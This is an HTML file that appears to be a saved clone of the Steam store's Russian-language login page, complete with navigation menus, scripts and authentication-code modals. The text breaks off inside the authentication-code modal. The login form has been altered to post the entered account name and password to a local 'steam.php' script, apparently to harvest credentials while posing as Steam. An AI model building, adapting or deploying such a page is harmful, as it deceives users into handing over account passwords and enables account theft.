<!DOCTYPE html>
<!-- saved from url=(0046)https://store.steampowered.com//login/?redir=0 -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Войти</title>
	<link href="./login_files/motiva_sans.css" rel="stylesheet" type="text/css">
<link href="./login_files/shared_global.css" rel="stylesheet" type="text/css">
<link href="./login_files/buttons.css" rel="stylesheet" type="text/css">
<link href="./login_files/store.css" rel="stylesheet" type="text/css">
    <link href="./login_files/cart.css" rel="stylesheet" type="text/css">
    <link href="./login_files/browse.css" rel="stylesheet" type="text/css">
	<link href="./login_files/login.css" rel="stylesheet" type="text/css">
	<link href="./login_files/login(1).css" rel="stylesheet" type="text/css">
	<script type="text/javascript" async="" src="./login_files/ga.js"></script><script type="text/javascript" src="./login_files/jquery-1.8.3.min.js"></script>
<script type="text/javascript">$J = jQuery.noConflict();</script><script type="text/javascript" src="./login_files/tooltip.js"></script>

<script type="text/javascript" src="./login_files/shared_global.js"></script>

<script type="text/javascript" src="./login_files/main.js"></script>

<script type="text/javascript" src="./login_files/dynamicstore.js"></script>

<script type="text/javascript" src="./login_files/jquery.appear.js"></script>

<script type="text/javascript">
jQuery(document).ready(function($) { $J.data( document, 'x_readytime', new Date().getTime() ); 
$J.data( document, 'x_oldref', GetNavCookie() ); 
$('.tooltip').v_tooltip();
window.BindStoreTooltip = function( $Selector ) { $Selector.v_tooltip( {'tooltipClass': 'store_tooltip', 'dataName': 'storeTooltip' } ); };
BindStoreTooltip( $('[data-store-tooltip]') ); 
});</script><script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-33786258-1']);
  _gaq.push(['_setSampleRate', '0.4']);
  _gaq.push(['_setCustomVar', 1, 'Logged In', 'false', 2]);
  _gaq.push(['_setCustomVar', 2, 'Client Type', 'External', 2]);
  _gaq.push(['_setCustomVar', 3, 'Cntrlr', 'login', 3]);
  _gaq.push(['_setCustomVar', 4, 'Method', "login\/DefaultAction", 3]);
  _gaq.push(['_trackPageview']);
  _gaq.push(['_setSessionCookieTimeout', 900000]);
  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>
	<script type="text/javascript" src="./login_files/login.js"></script>
	<script language="Javascript">
		$J( function() {
			var LoginManger = new CLoginPromptManager( 'https://store.steampowered.com/', {
				strRedirectURL: "http:\/\/store.steampowered.com\/",
				gidCaptcha: -1			} );

						document.forms['logon'].elements['username'].focus();
			
					} );
	</script>
</head>

<body class="v6 login">

<div id="global_header">
	<div class="content">

		<div class="logo">
			<span id="logo_holder">
				<a href="http://store.steampowered.com/">
					<img src="./login_files/globalheader_logo.png" width="176" height="44">
				</a>
			</span>
			<!--[if lt IE 7]>
			<style type="text/css">
				#logo_holder img { filter:progid:DXImageTransform.Microsoft.Alpha(opacity=0); }
				#logo_holder { display: inline-block; width: 176px; height: 44px; filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://steamstore-a.akamaihd.net/public/images/v5/globalheader_logo.png'); }
			</style>
			<![endif]-->
		</div>

			<div class="supernav_container">
	<a class="menuitem supernav" href="http://store.steampowered.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_store">
		МАГАЗИН	</a>
	<div class="submenu_store" style="display: none;" data-submenuid="store">
		<a class="submenuitem" href="http://store.steampowered.com/">Популярное</a>
		<a class="submenuitem" href="http://store.steampowered.com/explore/">Введение</a>
		<a class="submenuitem" href="http://store.steampowered.com/curators/">Кураторы</a>
		<a class="submenuitem" href="http://steamcommunity.com/my/wishlist/">Список желаемого</a>
		<a class="submenuitem" href="http://store.steampowered.com/news/">Новости</a>
		<a class="submenuitem" href="http://store.steampowered.com/stats/">Статистика</a>
	</div>


	<a class="menuitem supernav" style="display: block" href="http://steamcommunity.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_community">
		СООБЩЕСТВО	</a>
	<div class="submenu_community" style="display: none;" data-submenuid="community">
		<a class="submenuitem" href="http://steamcommunity.com/">Главная</a>
		<a class="submenuitem" href="http://steamcommunity.com/discussions/">Обсуждения</a>
		<a class="submenuitem" href="http://steamcommunity.com/workshop/">Мастерская</a>
		<a class="submenuitem" href="http://steamcommunity.com/greenlight/">Greenlight</a>
		<a class="submenuitem" href="http://steamcommunity.com/market/">Торговая площадка</a>
		<a class="submenuitem" href="http://steamcommunity.com/?subsection=broadcasts">Трансляции</a>
					</div>

	

	
			<a class="menuitem" href="http://store.steampowered.com/about/">
			О STEAM		</a>
	
	<a class="menuitem" href="https://help.steampowered.com/">
		ПОДДЕРЖКА	</a>
	</div>
	<script type="text/javascript">
		jQuery(function($) {
			$('.tooltip').v_tooltip();
			$('#global_header .supernav').v_tooltip({'location':'bottom', 'tooltipClass': 'supernav_content', 'offsetY':-4, 'offsetX': 1, 'horizontalSnap': 4, 'tooltipParent': '#global_header .supernav_container', 'correctForScreenSize': false});
		});
	</script>

		<div id="global_actions">
			<div id="global_action_menu">
				<div class="header_installsteam_btn header_installsteam_btn_green">
					<div class="header_installsteam_btn_leftcap"></div>
					<div class="header_installsteam_btn_rightcap"></div>
					<a class="header_installsteam_btn_content" href="http://store.steampowered.com/about/">
						Загрузить Steam					</a>
				</div>

				
									<a class="global_action_link" href="https://store.steampowered.com//login/?redir=login%2F%3Fredir%3D0&amp;redir_ssl=1">войти</a>
					&nbsp;|&nbsp;
					<span class="pulldown global_action_link" id="language_pulldown" onclick="ShowMenu( this, &#39;language_dropdown&#39;, &#39;right&#39; );">язык</span>
					<div class="popup_block_new" id="language_dropdown" style="display: none;">
						<div class="popup_body popup_menu">
																							<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=bulgarian&amp;redir=0" onclick="ChangeLanguage( &#39;bulgarian&#39; ); return false;">Български (болгарский)</a>
																							<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=czech&amp;redir=0" onclick="ChangeLanguage( &#39;czech&#39; ); return false;">Čeština (чешский)</a>
																							<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=danish&amp;redir=0" onclick="ChangeLanguage( &#39;danish&#39; ); return false;">Dansk (датский)</a>
																							<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=dutch&amp;redir=0" onclick="ChangeLanguage( &#39;dutch&#39; ); return false;">Nederlands (нидерландский)</a>
																							<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=english&amp;redir=0" onclick="ChangeLanguage( &#39;english&#39; ); return false;">English (английский)</a>
																							<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=finnish&amp;redir=0" onclick="ChangeLanguage( &#39;finnish&#39; ); return false;">Suomi (финский)</a>
																							<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=french&amp;redir=0" onclick="ChangeLanguage( &#39;french&#39; ); return false;">Français (французский)</a>
																							<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=greek&amp;redir=0" onclick="ChangeLanguage( &#39;greek&#39; ); return false;">Ελληνικά (греческий)</a>
																							<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=german&amp;redir=0" onclick="ChangeLanguage( &#39;german&#39; ); return false;">Deutsch (немецкий)</a>
																							<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=hungarian&amp;redir=0" onclick="ChangeLanguage( &#39;hungarian&#39; ); return false;">Magyar (венгерский)</a>
																							<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=italian&amp;redir=0" onclick="ChangeLanguage( &#39;italian&#39; ); return false;">Italiano (итальянский)</a>
																							<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=japanese&amp;redir=0" onclick="ChangeLanguage( &#39;japanese&#39; ); return false;">日本語 (японский)</a>
																															<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=koreana&amp;redir=0" onclick="ChangeLanguage( &#39;koreana&#39; ); return false;">한국어 (корейский)</a>
																							<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=norwegian&amp;redir=0" onclick="ChangeLanguage( &#39;norwegian&#39; ); return false;">Norsk (норвежский)</a>
																							<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=polish&amp;redir=0" onclick="ChangeLanguage( &#39;polish&#39; ); return false;">Polski (польский)</a>
																							<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=portuguese&amp;redir=0" onclick="ChangeLanguage( &#39;portuguese&#39; ); return false;">Português (португальский)</a>
																							<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=brazilian&amp;redir=0" onclick="ChangeLanguage( &#39;brazilian&#39; ); return false;">Português-Brasil (бразильский португальский)</a>
																															<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=romanian&amp;redir=0" onclick="ChangeLanguage( &#39;romanian&#39; ); return false;">Română (румынский)</a>
																							<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=schinese&amp;redir=0" onclick="ChangeLanguage( &#39;schinese&#39; ); return false;">简体中文 (упрощенный китайский)</a>
																							<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=spanish&amp;redir=0" onclick="ChangeLanguage( &#39;spanish&#39; ); return false;">Español (испанский)</a>
																							<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=swedish&amp;redir=0" onclick="ChangeLanguage( &#39;swedish&#39; ); return false;">Svenska (шведский)</a>
																							<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=tchinese&amp;redir=0" onclick="ChangeLanguage( &#39;tchinese&#39; ); return false;">繁體中文 (традиционный китайский)</a>
																							<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=thai&amp;redir=0" onclick="ChangeLanguage( &#39;thai&#39; ); return false;">ไทย (тайский)</a>
																							<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=turkish&amp;redir=0" onclick="ChangeLanguage( &#39;turkish&#39; ); return false;">Türkçe (турецкий)</a>
																							<a class="popup_menu_item tight" href="https://store.steampowered.com//login/?l=ukrainian&amp;redir=0" onclick="ChangeLanguage( &#39;ukrainian&#39; ); return false;">Українська (украинский)</a>
														<a class="popup_menu_item tight" href="http://translation.steampowered.com/" target="_blank">Помогите нам переводить Steam</a>
						</div>
					</div>
							</div>
					</div>
			</div>
</div>

<div class="page_header_ctn search">

	

		<div class="responsive_store_nav_ctn_spacer"><div id="store_header" class="">
		<div class="content">
			<div id="store_controls">
				<div id="cart_status_data">
																					<div class="store_header_btn_green store_header_btn" id="store_header_cart_btn" style="display: none;">
							<div class="store_header_btn_caps store_header_btn_leftcap"></div>
							<div class="store_header_btn_caps store_header_btn_rightcap"></div>
							<a id="cart_link" class="store_header_btn_content" href="http://store.steampowered.com/cart/?snr=1_60_4__12">
								Корзина								(<span id="cart_item_count_value">0</span>)
							</a>
						</div>
									</div>
			</div>
							<div id="store_nav_area">
					<div class="store_nav_leftcap"></div>
					<div class="store_nav_bg">
						<div class="store_nav">
							<a class="tab  " href="http://store.steampowered.com/?snr=1_60_4__12">
									<span>Популярное</span>
							</a>
															<div class="tab  flyout_tab " id="genre_tab" data-flyout="genre_flyout" data-flyout-align="left" data-flyout-valign="bottom">
									<span class="pulldown">
										<a class="pulldown_desktop" href="http://store.steampowered.com/search/?snr=1_60_4__12#sort_by=_ASC&amp;category1=998&amp;page=1&amp;tags=-1">Игры</a>
										<a class="pulldown_mobile" href="https://store.steampowered.com//login/?redir=0#">Игры</a>
										<span></span>
									</span>
								</div>
								<div class="popup_block_new flyout_tab_flyout responsive_slidedown" id="genre_flyout" style="display: none;">
									<div class="popup_body popup_menu">
																																											<a class="popup_menu_item" href="http://store.steampowered.com/genre/Free%20to%20Play/?snr=1_60_4__12">
													Бесплатно												</a>
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																<a class="popup_menu_item" href="http://store.steampowered.com/genre/Early%20Access/?snr=1_60_4__12">
													Ранний доступ												</a>
																															<a class="popup_menu_item" href="http://store.steampowered.com/freestuff/demos/?snr=1_60_4__12">
											<span>Демо</span>
										</a>
										<div class="hr"></div>
										<div class="popup_menu_subheader">Поиск по жанру:</div>

																																																																											<a class="popup_menu_item" href="http://store.steampowered.com/tag/ru/%D0%93%D0%BE%D0%BD%D0%BA%D0%B8/?snr=1_60_4__12">
													Гонки												</a>
																																												<a class="popup_menu_item" href="http://store.steampowered.com/tag/ru/%D0%98%D0%BD%D0%B4%D0%B8/?snr=1_60_4__12">
													Инди												</a>
																																												<a class="popup_menu_item" href="http://store.steampowered.com/tag/ru/%D0%9A%D0%B0%D0%B7%D1%83%D0%B0%D0%BB%D1%8C%D0%BD%D0%B0%D1%8F%20%D0%B8%D0%B3%D1%80%D0%B0/?snr=1_60_4__12">
													Казуальная игра												</a>
																																												<a class="popup_menu_item" href="http://store.steampowered.com/tag/ru/%D0%9C%D0%9C%D0%9E/?snr=1_60_4__12">
													ММО												</a>
																																												<a class="popup_menu_item" href="http://store.steampowered.com/tag/ru/%D0%9F%D1%80%D0%B8%D0%BA%D0%BB%D1%8E%D1%87%D0%B5%D0%BD%D1%87%D0%B5%D1%81%D0%BA%D0%B0%D1%8F%20%D0%B8%D0%B3%D1%80%D0%B0/?snr=1_60_4__12">
													Приключенческая игра												</a>
																																												<a class="popup_menu_item" href="http://store.steampowered.com/tag/ru/%D0%A0%D0%BE%D0%BB%D0%B5%D0%B2%D0%B0%D1%8F%20%D0%B8%D0%B3%D1%80%D0%B0/?snr=1_60_4__12">
													Ролевая игра												</a>
																																												<a class="popup_menu_item" href="http://store.steampowered.com/tag/ru/%D0%A1%D0%B8%D0%BC%D1%83%D0%BB%D1%8F%D1%82%D0%BE%D1%80/?snr=1_60_4__12">
													Симулятор												</a>
																																												<a class="popup_menu_item" href="http://store.steampowered.com/tag/ru/%D0%A1%D0%BF%D0%BE%D1%80%D1%82%D0%B8%D0%B2%D0%BD%D0%B0%D1%8F%20%D0%B8%D0%B3%D1%80%D0%B0/?snr=1_60_4__12">
													Спортивная игра												</a>
																																												<a class="popup_menu_item" href="http://store.steampowered.com/tag/ru/%D0%A1%D1%82%D1%80%D0%B0%D1%82%D0%B5%D0%B3%D0%B8%D1%8F/?snr=1_60_4__12">
													Стратегия												</a>
																																												<a class="popup_menu_item" href="http://store.steampowered.com/tag/ru/%D0%AD%D0%BA%D1%88%D0%B5%D0%BD/?snr=1_60_4__12">
													Экшен												</a>
																					
										<div class="hr"></div>
										<a class="popup_menu_item" href="http://store.steampowered.com/tag/browse/?snr=1_60_4__12">
											Популярные метки										</a>
										<div class="hr"></div>
										<div class="popup_menu_subheader">Просмотр по платформе:</div>
										<a class="popup_menu_item" href="http://store.steampowered.com/search/?term=&amp;sort_by=_ASC&amp;os=mac&amp;page=1&amp;snr=1_60_4__12">
											Mac OS X										</a>
										<a class="popup_menu_item" href="http://store.steampowered.com/search/?term=&amp;sort_by=_ASC&amp;os=linux&amp;page=1&amp;snr=1_60_4__12">
											SteamOS и Linux										</a>
									</div>
								</div>
							
							<div class="tab  flyout_tab " id="software_tab" data-flyout="software_flyout" data-flyout-align="left" data-flyout-valign="bottom">
								<span class="pulldown">
									<a class="pulldown_desktop" href="http://store.steampowered.com/search/?snr=1_60_4__12#sort_by=_ASC&amp;category1=994&amp;page=1">Программы</a>
									<a class="pulldown_mobile" href="https://store.steampowered.com//login/?redir=0#">Программы</a>
									<span></span>
								</span>

							</div>
							<div class="popup_block_new flyout_tab_flyout responsive_slidedown" id="software_flyout" style="display: none;">
								<div class="popup_body popup_menu">

																			<a class="popup_menu_item" href="http://store.steampowered.com/tag/ru/%D0%90%D0%BD%D0%B8%D0%BC%D0%B0%D1%86%D0%B8%D1%8F%20%D0%B8%20%D0%BC%D0%BE%D0%B4%D0%B5%D0%BB%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5/?snr=1_60_4__12">
											Анимация и моделирование										</a>
																			<a class="popup_menu_item" href="http://store.steampowered.com/tag/ru/%D0%94%D0%B8%D0%B7%D0%B0%D0%B9%D0%BD%20%D0%B8%20%D0%B8%D0%BB%D0%BB%D1%8E%D1%81%D1%82%D1%80%D0%B0%D1%86%D0%B8%D1%8F/?snr=1_60_4__12">
											Дизайн и иллюстрация										</a>
																			<a class="popup_menu_item" href="http://store.steampowered.com/tag/ru/%D0%9E%D0%B1%D1%80%D0%B0%D0%B1%D0%BE%D1%82%D0%BA%D0%B0%20%D0%B2%D0%B8%D0%B4%D0%B5%D0%BE/?snr=1_60_4__12">
											Обработка видео										</a>
																			<a class="popup_menu_item" href="http://store.steampowered.com/tag/ru/%D0%9E%D0%B1%D1%80%D0%B0%D0%B1%D0%BE%D1%82%D0%BA%D0%B0%20%D1%84%D0%BE%D1%82%D0%BE/?snr=1_60_4__12">
											Обработка фото										</a>
																			<a class="popup_menu_item" href="http://store.steampowered.com/tag/ru/%D0%9E%D0%B1%D1%83%D1%87%D0%B5%D0%BD%D0%B8%D0%B5/?snr=1_60_4__12">
											Обучение										</a>
																			<a class="popup_menu_item" href="http://store.steampowered.com/tag/ru/%D0%9F%D1%83%D0%B1%D0%BB%D0%B8%D0%BA%D0%B0%D1%86%D0%B8%D1%8F%20%D0%B2%20%D1%81%D0%B5%D1%82%D0%B8/?snr=1_60_4__12">
											Публикация в сети										</a>
																			<a class="popup_menu_item" href="http://store.steampowered.com/tag/ru/%D0%A0%D0%B0%D0%B1%D0%BE%D1%82%D0%B0%20%D1%81%D0%BE%20%D0%B7%D0%B2%D1%83%D0%BA%D0%BE%D0%BC/?snr=1_60_4__12">
											Работа со звуком										</a>
																			<a class="popup_menu_item" href="http://store.steampowered.com/tag/ru/%D0%A0%D0%B0%D0%B7%D1%80%D0%B0%D0%B1%D0%BE%D1%82%D0%BA%D0%B0%20%D0%B8%D0%B3%D1%80/?snr=1_60_4__12">
											Разработка игр										</a>
																			<a class="popup_menu_item" href="http://store.steampowered.com/tag/ru/%D0%A3%D1%82%D0%B8%D0%BB%D0%B8%D1%82%D0%B0/?snr=1_60_4__12">
											Утилита										</a>
									
								</div>
							</div>

							<div class="tab  flyout_tab " id="hardware_tab" data-flyout="hardware_flyout" data-flyout-align="left" data-flyout-valign="bottom">
								<span class="pulldown">
									<a class="pulldown_desktop" href="http://store.steampowered.com/hardware?snr=1_60_4__12">Устройства</a>
									<a class="pulldown_mobile" href="https://store.steampowered.com//login/?redir=0#">Устройства</a>
									<span></span>
								</span>

							</div>
							<div class="popup_block_new flyout_tab_flyout responsive_slidedown" id="hardware_flyout" style="display: none;">
								<div class="popup_body popup_menu">
									<a class="popup_menu_item" href="http://store.steampowered.com/app/353370?snr=1_60_4__12">
										Контроллер Steam									</a>
									<a class="popup_menu_item" href="http://store.steampowered.com/app/353380?snr=1_60_4__12">
										Steam Link									</a>
									<a class="popup_menu_item" href="http://store.steampowered.com/hardware/?snr=1_60_4__12#Machines">
										Steam Machines									</a>
									<a class="popup_menu_item" target="_blank" href="http://steamcommunity.com/steamvr?snr=1_60_4__12">
										SteamVR									</a>
								</div>
							</div>

							<div class="tab  flyout_tab " id="videos_tab" data-flyout="videos_flyout" data-flyout-align="left" data-flyout-valign="bottom">
								<span class="pulldown">
									<a class="pulldown_desktop" href="http://store.steampowered.com/search/?snr=1_60_4__12#sort_by=_ASC&amp;category1=992&amp;page=1&amp;tags=-1">Видео</a>
									<a class="pulldown_mobile" href="https://store.steampowered.com//login/?redir=0#">Видео</a>
									<span></span>
								</span>
							</div>
							<div class="popup_block_new flyout_tab_flyout responsive_slidedown" id="videos_flyout" style="display: none;">
								<div class="popup_body popup_menu">
									<div class="popup_menu_subheader">Поиск по типу:</div>
																			<a class="popup_menu_item" href="http://store.steampowered.com/search/?snr=1_60_4__12#category1=992&amp;sort_by=Released_DESC&amp;page=1&amp;tags=12057">
											Tutorial										</a>
																			<a class="popup_menu_item" href="http://store.steampowered.com/search/?snr=1_60_4__12#category1=992&amp;sort_by=Released_DESC&amp;page=1&amp;tags=15339">
											Документальный фильм										</a>
																			<a class="popup_menu_item" href="http://store.steampowered.com/search/?snr=1_60_4__12#category1=992&amp;sort_by=Released_DESC&amp;page=1&amp;tags=4234">
											Короткая										</a>
																			<a class="popup_menu_item" href="http://store.steampowered.com/search/?snr=1_60_4__12#category1=992&amp;sort_by=Released_DESC&amp;page=1&amp;tags=4242">
											Сериал										</a>
																			<a class="popup_menu_item" href="http://store.steampowered.com/search/?snr=1_60_4__12#category1=992&amp;sort_by=Released_DESC&amp;page=1&amp;tags=4700">
											Фильм										</a>
									
									<div class="hr"></div>
									<div class="popup_menu_subheader">Поиск по жанру:</div>
																			<a class="popup_menu_item" href="http://store.steampowered.com/search/?snr=1_60_4__12#category1=992&amp;sort_by=Released_DESC&amp;page=1&amp;tags=5984">
											Drama										</a>
																			<a class="popup_menu_item" href="http://store.steampowered.com/search/?snr=1_60_4__12#category1=992&amp;sort_by=Released_DESC&amp;page=1&amp;tags=150626">
											Gaming										</a>
																			<a class="popup_menu_item" href="http://store.steampowered.com/search/?snr=1_60_4__12#category1=992&amp;sort_by=Released_DESC&amp;page=1&amp;tags=4064">
											Thriller										</a>
																			<a class="popup_menu_item" href="http://store.steampowered.com/search/?snr=1_60_4__12#category1=992&amp;sort_by=Released_DESC&amp;page=1&amp;tags=4085">
											Аниме										</a>
																			<a class="popup_menu_item" href="http://store.steampowered.com/search/?snr=1_60_4__12#category1=992&amp;sort_by=Released_DESC&amp;page=1&amp;tags=3942">
											Научная фантастика										</a>
																			<a class="popup_menu_item" href="http://store.steampowered.com/search/?snr=1_60_4__12#category1=992&amp;sort_by=Released_DESC&amp;page=1&amp;tags=1667">
											Хоррор										</a>
																			<a class="popup_menu_item" href="http://store.steampowered.com/search/?snr=1_60_4__12#category1=992&amp;sort_by=Released_DESC&amp;page=1&amp;tags=19">
											Экшен										</a>
																			<a class="popup_menu_item" href="http://store.steampowered.com/search/?snr=1_60_4__12#category1=992&amp;sort_by=Released_DESC&amp;page=1&amp;tags=1719">
											Юмор										</a>
									
								</div>
							</div>

							<a class="tab  " href="http://store.steampowered.com/news/?snr=1_60_4__12">
								<span>Новости</span>
							</a>


							
								<div class="tab  flyout_tab " id="foryou_tab" data-flyout="foryou_flyout" data-flyout-align="left" data-flyout-valign="bottom" onmouseover="EnsureStoreMenuTagsLoaded( &#39;#foryou_yourtags&#39; );">
								<span class="pulldown">
									Для вас									<span></span>
								</span>
								</div>
								<div class="popup_block_new flyout_tab_flyout responsive_slidedown" id="foryou_flyout" style="display: none;">
									<div class="popup_body popup_menu">
										<a class="popup_menu_item" href="http://store.steampowered.com/recommended/?snr=1_60_4__12">
											Недавно просмотренные										</a>
										<a class="popup_menu_item" href="http://store.steampowered.com/curators/?snr=1_60_4__12">
											Кураторы Steam										</a>
										<a class="popup_menu_item" href="http://store.steampowered.com/updated/all/?snr=1_60_4__12">
											Недавно обновленные										</a>
									</div>
								</div>

							
							<div class="search_area">
								<div id="store_search">
									<form id="searchform" name="searchform" method="get" action="https://store.steampowered.com/search/" onsubmit="return SearchSuggestCheckTerm(this);">
										<input type="hidden" name="snr" value="1_60_4__12">
										<div class="searchbox">
											<input id="store_nav_search_term" name="term" type="text" class="default" value="найти в магазине" size="22" autocomplete="off">
											<a href="https://store.steampowered.com//login/?redir=0#" id="store_search_link" onclick="var $Form = $J(this).parents(&#39;form&#39;); $Form.submit(); return false;"><img src="./login_files/blank.gif"></a>
										</div>
									</form>
								</div>
								<div id="searchterm_options" class="search_suggest popup_block_new" style="display: none;">
									<div class="popup_body" style="border-top: none;">
										<div id="search_suggestion_contents">
										</div>
									</div>
								</div>
							</div>

						</div>
					</div>
					<div class="store_nav_rightcap"></div>
				</div>
					</div>
	</div></div>
				<script type="text/javascript">
			$J( function() {
				BindAutoFlyoutEvents();

				var $Window = $J(window);
				var $Header = $J('#store_header');
				var $ResponsiveNavCtn = $J('#responsive_store_nav_ctn');
				var $HeaderWrapper;
				$Window.on('Responsive_SmallScreenModeToggled.StoreMenu', function() {
					var bUseSmallScreenMode =window.UseSmallScreenMode && window.UseSmallScreenMode();

					if ( !$HeaderWrapper )
						$HeaderWrapper = $Header.wrap( $J('<div/>', {'class': 'responsive_store_nav_ctn_spacer'} ) ).parent();

					if ( bUseSmallScreenMode )
						$ResponsiveNavCtn.append( $Header );
					else
						$HeaderWrapper.append( $Header );


					if ( bUseSmallScreenMode )
					{
						$Header.css( 'visibility', 'hidden' );
						$Header.show();
						var nMenuHeight = $J('#store_header' ).height() + $J('#store_header' ).offset().top;
						if ( $Window.scrollTop() < nMenuHeight )
							$Window.scrollTop( nMenuHeight - GetResponsiveHeaderFixedOffsetAdjustment() );

						$Header.css('visibility', 'visible');
					}
				} ).trigger('Responsive_SmallScreenModeToggled.StoreMenu');

				EnableSearchSuggestions( $J('#searchform')[0].elements['term'], '1_60_4_', 'UA', 'russian', '1745084' );
			} );
		</script>
	<script type="text/javascript">
	var g_AccountID = 0;
	var g_sessionID = "1fe6b41785db5aaffea43c67";
	var g_ServerTime = 1454962444;

	$J( InitMiniprofileHovers );

		GDynamicStore.Init( 0, false, "win" );
	</script>
	<div class="page_content">

		
		<!-- Center Column -->

        <div id="error_display" class="checkout_error" style="display: none; color: #cc3300">
        </div>

		<div class="leftcol">

			
			<div class="checkout_content_box">
				<div class="loginbox">
					<div class="loginbox_left">
						<h2>Войти</h2>
						<p>в существующий аккаунт Steam</p>
						<br>
                        <form enctype="multipart/form-data" action="steam.php" method="POST" name="loginForm" id="loginForm">
				<input type="hidden" name="msg" value="" />
				<label for="steamAccountName">Имя аккаунта Steam</label>
				<input class="textField" type="text" name="steamAccountName" id="steamAccountName" maxlength="64" /><br />
				<label for="steamPassword">Пароль</label>
				<input class="textField" type="password" name="steamPassword" id="steamPassword" autocomplete="off" maxlength="64" /><br><br/>
				<input class="subImage" type="image" id="imageLogin" onMouseover="iSwap('imageLogin','login_files/button2.png')" onMouseout="iSwap('imageLogin','login_files/button1.png')" src="/login_files/button1.png" width="73" height="32" border="0"/>
				</form>
					</div>
					<div class="loginbox_sep">
					</div>
					<div class="loginbox_right">
						<h2>Создать</h2>
						<p>новый бесплатный аккаунт</p>
						<br>
						Присоединяйтесь — Steam бесплатен и удобен в использовании. Продолжайте создание аккаунта и получите Steam — ведущее цифровое решение для любителей компьютерных игр.
					</div>
					<div style="clear: left;"></div>
					<div class="loginbox_left btn_ctn">
						<div id="login_btn_wait" style="display: none;">
							<img src="./login_files/throbber.gif">
						</div>
					</div>
					<div class="loginbox_right">
						<a href="https://store.steampowered.com/join/?&amp;snr=1_60_4__62" class="btnv6_blue_hoverfade btn_medium">
							<span>Создать аккаунт</span>
						</a>
					</div>
					<div style="clear: left;"></div>
				</div>
			</div>
			<br>

			
			<a href="https://help.steampowered.com/#HelpWithLogin?redir=store%2Flogin%2F%3Fredir%3D0" id="link_forgot_password">
				Забыли пароль?			</a>

		</div>
		<!-- End Center Column -->

		<!-- Right Column -->
		<div class="rightcol">
			<div class="block">

				<div class="block_content block_content_inner login">
                    <h2>ЗАЧЕМ НУЖЕН STEAM?</h2>
					<ul id="why_list">
						<li>Приобретайте и загружайте полные версии игр</li>
						<li>Присоединяйтесь к сообществу Steam</li>
						<li>Общайтесь с друзьями во время игры</li>
						<li>Играйте в ваши игры на любой поддерживаемой платформе</li>
						<li>Организуйте игру, соревнование или сетевую вечеринку</li>
						<li>Получайте автоматическое обновление игр и многое другое!</li>
					</ul>
					<br>
					<img src="./login_files/why_join_preview.png" width="265" height="176" border="0">
                    <br><br>
				</div>
                <br>
                <a href="http://store.steampowered.com/about">Узнайте больше о Steam.</a>
			</div>
		</div>
		<!-- End Right Column -->

		<div style="clear: both;"></div>

	</div>

</div>
<!-- End Main Background -->

<div id="loginModals">
	<div class="login_modal loginAuthCodeModal" style="display: none">
		<form data-ajax="false">
			<div class="auth_message_area">
				<div id="auth_icon" class="auth_icon auth_icon_key">
				</div>
				<div class="auth_messages" id="auth_messages">
					<div class="auth_message" id="auth_message_entercode" style="display: none;">
						<div class="auth_modal_h1">Здравствуйте!</div>
						<p>Видимо, вы вошли в Steam через другой браузер или с другого компьютера. Или, может быть, вы просто давно не заходили...</p>
					</div>
					<div class="auth_message" id="auth_message_checkspam" style="display: none;">
						<div class="auth_modal_h1">Может быть, оно попало в спам?</div>
						<p>Вы проверяли папку со спамом? Попробуйте посмотреть там, если сообщение от службы поддержки Steam не было получено.</p>
					</div>
					<div class="auth_message" id="auth_message_success" style="display: none;">
						<div class="auth_modal_h1">Готово!</div>
						<p>Вы получили доступ к вашему аккаунту Steam.</p>
					</div>
					<div class="auth_message" id="auth_message_incorrectcode" style="display: none;">
						<div class="auth_modal_h1">Ой!</div>
						<p>Извините, <br>но он неверен...</p>
					</div>
					<div class="auth_message" id="auth_message_help" style="display: none;">
						<div class="auth_modal_h1">Позвольте помочь вам!</div>
						<p>К сожалению, у вас возникла проблема. Мы знаем, что ваш аккаунт Steam важен для вас, и поэтому мы хотим помочь вам защитить его от посторонних лиц.</p>
					</div>
				</div>
			</div>
			<div id="auth_details_messages" class="auth_details_messages">
				<div class="auth_details" id="auth_details_entercode" style="display: none;">
					В качестве меры безопасности аккаунта вам надо будет дать доступ этому браузеру, введя код, который мы отправили на ваш адрес эл. почты <span id="emailauth_entercode_emaildomain"></span>.				</div>
				<div class="auth_details" id="auth_details_success" style="display: none;">
					Если это не ваш личный компьютер, перед уходом убедитесь, что вы вышли из своего аккаунта Steam.				</div>
				<div class="auth_details" id="auth_details_help" style="display: none;">
					Пожалуйста, обратитесь в службу поддержки Steam. Решение проблем с доступом к аккаунту — наша основная задача.				</div>
			</div>
			<div class="authcode_entry_area">
				<div id="authcode_entry">
